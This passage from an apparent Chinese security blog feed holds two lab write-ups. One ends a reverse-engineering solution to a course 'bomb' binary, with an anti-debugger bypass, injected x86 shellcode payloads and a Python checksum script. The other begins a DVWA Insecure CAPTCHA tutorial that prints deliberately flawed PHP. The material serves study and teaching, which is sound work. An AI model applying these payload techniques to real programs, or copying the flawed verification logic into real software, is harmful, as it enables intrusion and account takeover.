1000），然而这一堆红色地址的代码已经在 phase_impossible 函数的外面了，也就是说不会被执行</p><p>就汇编代码的分析来看，phase_impossible 正常情况下一定会从 explode_bomb 退出程序，因为 explode_bomb 中调用了 exit，所以 GetTickCount 函数没有起到什么作用，我们可以忽略它</p><br><h2 id="绕过-IsDebuggerPresent"><a href="#绕过-IsDebuggerPresent" class="headerlink" title="绕过 IsDebuggerPresent"></a>绕过 IsDebuggerPresent</h2><p>该函数的作用是检测是否存在调试器，具体代码如下</p><p><img src="../img/13.png" alt="bomb"></p><p>我们不关心它是怎么实现的，如果存在调试器，返回值 eax 的值不会是零，想要绕过它就需要 jz 跳转指令成功跳转，有两种方法</p><ul><li>test eax, eax 时让 eax 等于零</li><li>jz 跳转时让 ZF 标志位等于 1</li></ul><p>因为我用的 ollydbg 里装了防检测调试器的插件，所以这里检测不到我在调试 = =，也就不好演示了，这些直接在调试器里改就好了，test 的时候把 eax 改成 0，或者 jz 的时候把 ZF 改成 1</p><br><h2 id="tohex-函数"><a href="#tohex-函数" class="headerlink" title="tohex 函数"></a>tohex 函数</h2><p>伪代码：</p><p><img src="../img/14.png" alt="bomb"></p><p>看起来比较复杂，其实实现的功能很简单，来一步步分析</p><p><img src="../img/15.png" alt="bomb"></p><p>首先给四个局部变量赋值，a1 是 tohex 的第一个参数，也就是在 phase_impossible 中初始化为全零的 v2 的地址，这里的局部变量 v2 可与之视作相同变量处理，以后提到 v2 就指代这个数组</p><p>之后是一个 while( 1 ) 循环，退出条件如下</p><p><img src="../img/16.png" alt="bomb"></p><p>v7 是什么呢，上面一行定义了 v7 = (char *) (v6 + a2)，是个字符指针，而刚进入 while 循环时，v6 = v4 = 0</p><p>所以第一次循环时 v7 = (char *) (a2 + 0)，a2 是 tohex 的第二个参数，即我们输入的字符串，这样的表示或许有些陌生，我们换一种表示方式，v7 = a2[0]，是不是亲切了许多呢？</p><p>因为 v6 = v4++，下一次循环 v4 变成了 1，所以下一次循环的 v7 = a2[v6] = a2[1]，结合 while 循环的退出条件可知，这个循环在遍历我们输入的字符串，当读到字符串末尾时退出</p><br><p>那遍历字符串做了什么处理呢？来看第二个 if 嵌套的判断条件</p><p><img src="../img/17.png" alt="bomb"></p><p>又是一个熟悉的表达方式 <strong>*(数组 + 偏移)</strong>，注意这里的 ctypetab 是一个 2 字节（word *）的指针，所以它指向的那个地址才是真正的数组，双击 ctypetab 过去看看</p><p><img src="../img/18.png" alt="bomb"></p><p>ctypetab 里存的是地址 0x40D8EE，再双击这个 unk_40D8EE，我们就可以看到一个类似数组的东西</p><p><img src="../img/19.png" alt="bomb"></p><p>因为 ctypetab 是一个 2 字节的指针，每次访问两个字节，所以 unk_40D8EE 这个数组的元素都是 2 字节的</p><p>又由于小端序的问题，所以 unk_40D8EE[0] = 0x0010，unk_40D8EE[9] = 0x0130</p><p><img src="../img/20.png" alt="bomb"></p><p>理解了这个我们再回到第二个 if 嵌套的判断条件</p><p><img src="../img/17.png" alt="bomb"></p><p>这里的 *(ctypetab + v7) 即为 unk_40D8EE[v7]，v7为我们输入的字符串中的一个字符，将其 ascii 码作为索引，在 unk_40D8EE 这个数组里寻找元素，拿来和 2 进行与运算，只有结果不为零的字符才能进入下层 if 中处理</p><p>于是乎，这个 if 判断的作用便一目了然了，这里其实是在检查输入字符的有效性，如果 unk_40D8EE 数组长度为 256，给这个数组每个元素都赋上一个值，保证能作为输入字符的 ascii 码的偏移对应的值和 2 与了之后不为 0，其他非法字符在数组中对应的值和 2 与了之后为 0，就可以建立 chr( 0 ) 到 chr( 255 ) 字符的白名单</p><p>在 ida 中将 unk_40D8EE 这个数组全部选中，shift + e 导出为不带空格的 hex 字符串</p><p><img src="../img/21.png" alt="bomb"></p><p>用 python 处理一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;export_results.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">data = f.read()</span><br><span class="line"></span><br><span class="line">base = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(data), <span class="number">4</span>):</span><br><span class="line">base.append(<span class="built_in">int</span>(data[i+<span class="number">2</span>:i+<span class="number">4</span>] + data[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">127</span>):</span><br><span class="line"><span class="keyword">if</span> base[i] &amp; <span class="number">2</span>:</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(i), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>输出的结果为：<strong>0123456789ABCDEFabcdef</strong></p><p>也就是说，只有这些字符才会被接受，这个结果也符合我们的直观感受，因为 16 进制就是这些字符</p><br><p>剩下的部分就是在对合法的字符进行处理了</p><p><img src="../img/22.png" alt="bomb"></p><p>每种字符的处理方法如下</p><ul><li>如果是字符 ‘0’ ~ ‘9’，则减去 ‘0’ 的 ascii 变成数值 0 ~ 9</li><li>如果是字符 ‘a’ ~ ‘f’，则减去 ‘W’ 的 ascii 变成数值 10 ~ 15</li><li>如果是字符 ‘A’ ~ ‘F’，则减去 ‘7’ 的 ascii 变成数值 10 ~ 15</li></ul><p>同时使用 v3 作为 flag，当 v3 = 1，也就是处理到 16 进制一个字节的 “十位” 时，将其记录在 v9 中，v3 置 0，下次循环取到这个字节的 “个位” ，用 <strong>16 * “十位” + “个位”</strong> 就能得到内存中真正的 16 进制形式的一字节，并将其放在局部变量指针 v2 的相应字节处（也就是 phase_impossible 的 v2），v2++ 指向下一空字节，v3 置 1，以便下一次循环取下一字节的 “十位”</p><p>举个例子，假如我们输入 “8ED3”，那么第一次循环取到字符 ‘8’，减 ‘0’ 的 ascii 后得到 8，放到局部变量 v9 中，v3 置 0，第二次循环取到字符 ‘E’，减去 ‘E’ 的 ascii 得到 14，拿 14 + 16 * 8 就等于 0x8E，存储到 v2[0] 中，v3 置 1，同理，v2[1] = 0xD3</p><p>函数最后的 *v2 = 0 就是将字符串数组加上 \x00 结束符</p><br><h2 id="check-buf-valid-函数"><a href="#check-buf-valid-函数" class="headerlink" title="check_buf_valid 函数"></a>check_buf_valid 函数</h2><p>伪代码：</p><p><img src="../img/23.png" alt="bomb"></p><p>a1 和 a2 分别是 tohex 处理后的 v2 数组和 rand_div</p><p>有了前面的叙述，这个应该很好理解了，用 python 翻译一下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_buf_valid</span>(<span class="params">a1, a2</span>):</span></span><br><span class="line">    v3 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">v3 ^= a1[i]</span><br><span class="line"><span class="keyword">return</span> v3 == a2</span><br></pre></td></tr></table></figure><p>这里就出现了一个问题，v3 是一个字节，a2 是 rand_div，是 4 个字节，它们怎么进行比较？</p><p>汇编代码：</p><p><img src="../img/24.png" alt="bomb"></p><p>cl 和 al 符号拓展为 4 字节后比较必须相等，也就是说 cl 和 al 本身就应该相等，即 v3 要和 rand_div 的最低字节相等，这一点从函数的参数类型声明也可以看出</p><p><img src="../img/25.png" alt="bomb"></p><p><strong>这里的 a2 类型为 char</strong>，也就是只取 rand_div 的最低字节</p><br><h2 id="动态生成指令"><a href="#动态生成指令" class="headerlink" title="动态生成指令"></a>动态生成指令</h2><p>伪代码：</p><p><img src="../img/26.png" alt="bomb"></p><p>生成 0 ~ 2 的一个数，然后分别去向 goto_buf_0，goto_buf_1，goto_buf_2</p><p><img src="../img/27.png" alt="bomb"></p><p>可以看到，这三个函数作用都相同，都相当于 jmp eax，也就是不管进哪个分支，最后程序都会跳转到我们布置的 v2 去执行，所以分析此时的栈分布就显得尤为重要</p><p>从 main 函数开始</p><p><img src="../img/28.png" alt="bomb"></p><p>红框中为 main 的函数序言及保存部分寄存器，在 main 的末尾也有还原现场和函数尾声：</p><p><img src="../img/29.png" alt="bomb"></p><p>所以此时 main 的栈帧如下：</p><p><img src="../img/30.png" alt="bomb"></p><p>然后 main 调用了 phase_impossible</p><p><img src="../img/31.png" alt="bomb"></p><p>同理，此时栈的分布为：</p><p><img src="../img/32.png" alt="bomb"></p><p>现在 phase_impossible 要调用 goto_buf_0（三个都一样，挑一个来说）</p><p><img src="../img/33.png" alt="bomb"></p><p>而 goto_buf_0 就一句 jmp eax，所以在跳之前，栈是这样的：</p><p><img src="../img/34.png" alt="bomb"></p><p>由下图可知，只要 phase_impossible 函数正常返回，就能输出第五关通关信息</p><p><img src="../img/35.png" alt="bomb"></p><p>所以构造如下汇编：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>即可完成 phase_impossible 函数的函数尾声</p><p>在调试器中随便找个空白的地方将汇编写入，得知其机器码，如图，为 “8BE55DC3”</p><p><img src="../img/36.png" alt="bomb"></p><p>如果我们就将这个字符串作为输入，经过 tohex 处理后，在内存中的确为 8BE55DC3，但是会过不了 check_buf_valid，我们还需要在其后添加一个字节，这个字节的值要等于 v3 ^ rand_div 的最低字节</p><p>以学号 001044 为例，经过计算（也可以直接调试），GenerateRandomNumber(0x400) 后，rand_div 为 0x1C7，最低字节为 C7，此时的 v2 数组前 4 个为 8B E5 5D C3，后面全是 0，一个数与 0 异或还是其本身，所以 v3 的值就等于前面的 4 个字节异或的结果</p><p>此时要求 v3 = rand_div 的最低字节，所以应该在 8B E5 5D C3 后加一个与 v3 异或后等于 rand_div 最低字节的值，由 v3 ^ 0xC7 得出，值为 0x37，拼接在 payload 后面，得到最终输入 “8BE55DC337”</p><p>这些步骤可以由 python 得出（仅适用于这个学号）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">in1t</span>(<span class="params">num</span>):</span></span><br><span class="line"><span class="keyword">global</span> rand_l, rand_h, rand_div</span><br><span class="line">rand_l = <span class="number">666</span></span><br><span class="line">rand_h = <span class="built_in">int</span>(num)</span><br><span class="line">rand_div = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">GenerateRandomNumber</span>(<span class="params">mod</span>):</span></span><br><span class="line"><span class="keyword">global</span> rand_l, rand_h, rand_div</span><br><span class="line">res = <span class="built_in">hex</span>(rand_l + <span class="number">1791398085</span> * rand_h)[<span class="number">2</span>:].rjust(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">rand_l = <span class="built_in">int</span>(res[:<span class="number">8</span>], <span class="number">16</span>)</span><br><span class="line">rand_h = <span class="built_in">int</span>(res[<span class="number">8</span>:], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">if</span> mod == <span class="number">0</span>:</span><br><span class="line">rand_div = <span class="number">0</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">rand_div = rand_h % mod</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">payload</span>):</span></span><br><span class="line">in1t(<span class="string">&quot;001044&quot;</span>)</span><br><span class="line">GenerateRandomNumber(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">GenerateRandomNumber(<span class="number">2</span>)</span><br><span class="line">GenerateRandomNumber(<span class="number">0x1A</span>)</span><br><span class="line">GenerateRandomNumber(<span class="number">0xD</span>)</span><br><span class="line">GenerateRandomNumber(<span class="number">0xA</span>)</span><br><span class="line">GenerateRandomNumber(<span class="number">0xE</span>)</span><br><span class="line">GenerateRandomNumber(<span class="number">8</span>)</span><br><span class="line">GenerateRandomNumber(<span class="number">0xC8</span>)</span><br><span class="line">GenerateRandomNumber(<span class="number">0x14</span>)</span><br><span class="line">GenerateRandomNumber(<span class="number">7</span>)</span><br><span class="line">GenerateRandomNumber(<span class="number">0x400</span>)</span><br><span class="line"></span><br><span class="line">v2 = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">v3 = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(payload), <span class="number">2</span>):<span class="comment"># tohex</span></span><br><span class="line">v2[i//<span class="number">2</span>] = <span class="built_in">int</span>(payload[i:i+<span class="number">2</span>], <span class="number">16</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):<span class="comment"># check_buf_valid</span></span><br><span class="line">v3 ^= v2[i]</span><br><span class="line">lsb_of_div = <span class="built_in">int</span>(<span class="built_in">hex</span>(rand_div)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>)[-<span class="number">2</span>:], <span class="number">16</span>)</span><br><span class="line">last_byte = <span class="built_in">hex</span>(v3 ^ lsb_of_div)[<span class="number">2</span>:].rjust(<span class="number">2</span>,<span class="string">&#x27;0&#x27;</span>).upper()</span><br><span class="line"><span class="built_in">print</span>(payload + last_byte)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">payload = <span class="string">&quot;8BE55DC3&quot;</span></span><br><span class="line">test(payload)</span><br></pre></td></tr></table></figure><p>将这个运行结果输入，第五关就算是完成了</p><p><img src="../img/37.png" alt="bomb"></p><br><h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>翻一翻 ida 的函数左侧的函数名称窗口，可以找到一个名为 phase_secret 的函数，它的作用就是输出一个彩蛋字符串</p><p><img src="../img/38.png" alt="bomb"></p><p>我们只要构造好汇编代码，控制程序的返回流先正常返回到 main，输出第五关通关，然后再跳转到 phase_secret 去输出彩蛋信息就行了，所以答案不唯一</p><p>我的思路是这样的，首先让执行流返回到 main，输出第五关过关，所以我需要两条指令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push 0x401240</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>来到 0x401240顺着执行下来，输出过关信息，然后遇到 main 的函数尾声</p><p><img src="../img/39.png" alt="bomb"></p><p>下面的红框执行到 retn 时，栈分布为：</p><p><img src="../img/40.png" alt="bomb"></p><p>esp 指向的 phase_impossible 返回地址其实也是 0x401240，所以程序又会输出一遍第五关过关</p><p>那如果把 phase_impossible 的返回地址改为 phase_secret 函数的地址，函数在输出完第五关通关后，就会输出彩蛋，这也正是我们要的顺序，所以我们让栈帧先回退一下，修改完返回地址再还原</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp; 回退栈帧</span><br><span class="line">pop ebp; 回退栈帧</span><br><span class="line">pop ebx; 将 esp + 4，使得能够覆盖返回地址</span><br><span class="line">push 0x4014F0; 将 phase_impossible 返回地址覆盖为 phase_secret 地址</span><br><span class="line">push ebp; 还原栈帧</span><br><span class="line">mov ebp,esp; 还原栈帧</span><br><span class="line">push 1; 对应 pop ebx</span><br><span class="line">push 2; 对应 pop esi</span><br><span class="line">push 3; 对应 pop edi</span><br><span class="line">push 0x401240; 输出第五关通关</span><br><span class="line">ret; 返回到 0x401240</span><br></pre></td></tr></table></figure><p>这样看似完美了，在输出完第五关通关后，确实输出了彩蛋，但是输出完彩蛋，程序无法正常返回</p><p><img src="../img/38.png" alt="bomb"></p><p>原因是当 phase_secret 执行到 retn 时，esp 正指向 main 保存的 edi</p><p><img src="../img/41.png" alt="bomb"></p><p>这个值是多少无从知晓，但一般都不是什么正常的地址，我们就丢失了对程序的控制，所以在原来的代码基础上，我们再将这个位置的值改为 0x40125B</p><p><img src="../img/42.png" alt="bomb"></p><p>就能使 main 正常返回了，增加两条指令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br><span class="line">pop ebx</span><br><span class="line">pop ebx; 多 pop 一下</span><br><span class="line">push 0x40125B; 先覆盖 main 保存 edi 的位置</span><br><span class="line">push 0x4014F0; 再将 phase_impossible 返回地址覆盖为 phase_secret</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">push 1</span><br><span class="line">push 2</span><br><span class="line">push 3</span><br><span class="line">push 0x401240</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p><img src="../img/43.png" alt="bomb"></p><p>所以 payload 为 “8BE55D5B5B685B12400068F0144000558BEC6A016A026A036840124000C3”</p><p>再用上面的 python 脚本算一下最后一个字节要补什么，以 001044 为例，要补 B8</p><p><img src="../img/44.png" alt="bomb"></p><p>到这里就算全部完成了</p><p>撒花✿✿ヽ(°▽°)ノ✿</p><br><h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>链接：<a href="https://pan.baidu.com/s/1E976OE3ef46Vyc9FTLOOTg">网盘</a><br>提取码：rwrv</p>]]></content>
      
      
      
        <tags>
            
            <tag> 逆向 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Insecure CAPTCHA</title>
      <link href="/2020/02/28/Insecure-CAPTCHA/"/>
      <url>/2020/02/28/Insecure-CAPTCHA/</url>
      
        <content type="html"><![CDATA[<h2 id="Insecure-CAPTCHA-简介"><a href="#Insecure-CAPTCHA-简介" class="headerlink" title="Insecure CAPTCHA 简介"></a>Insecure CAPTCHA 简介</h2><p>Insecure CAPTCHA，意为不安全的验证码，CAPTCHA 全称是 Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试) </p><p>相信以往在访问网页的时候，大家或多或少地接触过如下的人机验证</p><p><img src="../img/Insecure-CAPTCHA/1.png" alt="Insecure-CAPTCHA"></p><p>验证码的确是解决 CSRF 漏洞的一大利器，不过这里的不安全验证码我个人觉得更偏向于描述<strong>不安全的验证逻辑</strong>，谷歌提供的验证码服务的确很好地区别开了人与机器，而且无漏洞利用可言，只有当网站服务器验证思路不严谨时才会导致该种安全事件的发生</p><p>所以 DVWA 的这一分栏更多的是偏向代码审计，找到服务器验证流程的逻辑缺陷</p><br><h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><p>在开始之前，因为我们没有配置过谷歌该应用接口的秘钥，所以会在网页中报错，并让你去下面的那个网站里申请</p><p><img src="../img/Insecure-CAPTCHA/2.png" alt="Insecure-CAPTCHA"></p><p>我们也没必要科学上网，怪麻烦的，直接在 config.inc.php 里随便改个值就好了，毕竟验证系统本身是没有问题的，我们要找的是网站自身代码的问题</p><p><img src="../img/Insecure-CAPTCHA/3.png" alt="Insecure-CAPTCHA"></p><p>返回到 DVWA 中重新访问该分栏，就显示了一个和 CSRF 差不多的改密码对话框，Change 按钮的上面应该还有个验证码区域，因为没有科学上网，所以显示不出来</p><p><img src="../img/Insecure-CAPTCHA/4.png" alt="Insecure-CAPTCHA"></p><p>那么直接来看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vulnerabilities/captcha/source/low.php</span></span><br><span class="line"><span class="comment">// step 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;1&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line"><span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check CAPTCHA from 3rd party</span></span><br><span class="line"><span class="variable">$resp</span> = recaptcha_check_answer( <span class="variable">$_DVWA</span>[ <span class="string">&#x27;recaptcha_private_key&#x27;</span> ],</span><br><span class="line"><span class="variable">$_SERVER</span>[ <span class="string">&#x27;REMOTE_ADDR&#x27;</span> ],</span><br><span class="line"><span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_challenge_field&#x27;</span> ],</span><br><span class="line"><span class="variable">$_POST</span>[ <span class="string">&#x27;recaptcha_response_field&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Did the CAPTCHA fail?</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="variable">$resp</span>-&gt;is_valid ) &#123;</span><br><span class="line"><span class="comment">// What happens when the CAPTCHA was entered incorrectly</span></span><br><span class="line"><span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;&lt;br /&gt;The CAPTCHA was incorrect. Please try again.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// CAPTCHA was correct. Do both new passwords match?</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// Show next stage for the user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;pre&gt;&lt;br /&gt;You passed the CAPTCHA! Click the button to confirm your changes.&lt;br /&gt;&lt;/pre&gt;</span></span><br><span class="line"><span class="string">&lt;form action=\&quot;#\&quot; method=\&quot;POST\&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;input type=\&quot;hidden\&quot; name=\&quot;step\&quot; value=\&quot;2\&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=\&quot;hidden\&quot; name=\&quot;password_new\&quot; value=\&quot;<span class="subst">&#123;$pass_new&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=\&quot;hidden\&quot; name=\&quot;password_conf\&quot; value=\&quot;<span class="subst">&#123;$pass_conf&#125;</span>\&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;input type=\&quot;submit\&quot; name=\&quot;Change\&quot; value=\&quot;Change\&quot; /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Both new passwords do not match.</span></span><br><span class="line"><span class="variable">$html</span>     .= <span class="string">&quot;&lt;pre&gt;Both passwords must match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看出，除了需要 POST 修改的密码以外，还要 POST 用于验证码判断的参数和一个 step 参数来表明现在的操作是第几步</p><p>第一步就是调用 recaptcha_check_answer 在第三方服务那里进行人机验证，如果验证通过且新密码与确认密码相同，就允许进行第二步</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// step 2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) &amp;&amp; ( <span class="variable">$_POST</span>[ <span class="string">&#x27;step&#x27;</span> ] == <span class="string">&#x27;2&#x27;</span> ) ) &#123;</span><br><span class="line"><span class="comment">// Hide the CAPTCHA form</span></span><br><span class="line"><span class="variable">$hide_form</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Get input</span></span><br><span class="line"><span class="variable">$pass_new</span>  = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line"><span class="variable">$pass_conf</span> = <span class="variable">$_POST</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Check to see if both password match</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line"><span class="comment">// They do!</span></span><br><span class="line"><span class="variable">$pass_new</span> = mysql_real_escape_string( <span class="variable">$pass_new</span> );</span><br><span class="line"><span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Update database</span></span><br><span class="line"><span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysql_query( <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . mysql_error() . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line"><span class="comment">// Feedback for the end user</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="comment">// Issue with the passwords matching</span></span><br><span class="line"><span class="variable">$html</span> .= <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$hide_form</span> = <span class="literal">false</span>;</span><br><span 